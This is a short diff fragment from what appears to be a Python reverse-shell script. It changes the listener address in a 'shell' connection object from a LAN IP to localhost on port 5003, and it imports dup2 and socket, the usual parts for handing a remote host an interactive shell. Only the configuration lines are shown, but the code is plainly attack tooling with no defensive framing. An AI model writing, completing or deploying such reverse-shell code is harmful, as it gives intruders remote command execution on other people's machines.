@@ -29,7 +29,7 @@ while True:
             self.TARGET_IPADDRESS = TARGET_IPADDRESS
             self.TARGET_PORT = TARGET_PORT
             
-    REVERSE_CONNECTION = shell("192.168.2.112", int(5003))
+    REVERSE_CONNECTION = shell("127.0.0.1", int(5003))
 
     from os import dup2
     import socket
